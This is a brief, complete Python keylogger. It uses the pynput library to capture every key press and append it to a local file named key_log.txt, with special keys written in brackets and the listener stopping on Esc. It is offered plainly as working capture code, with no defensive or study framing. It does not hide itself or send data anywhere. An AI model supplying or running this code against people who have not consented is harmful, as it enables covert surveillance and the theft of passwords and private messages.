from pynput import keyboard

# The file where keystrokes will be logged
log_file = "key_log.txt"

# Function to write keystrokes to file
def write_to_file(key):
    with open(log_file, "a") as file:
        try:
            # Remove quotes from key string
            file.write(str(key.char))
        except AttributeError:
            # For special keys (like Enter, Space, etc.), write the key name
            file.write(f'[{key}]')

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events (optional)
def on_release(key):
    # Stop the keylogger if Esc is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening for keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
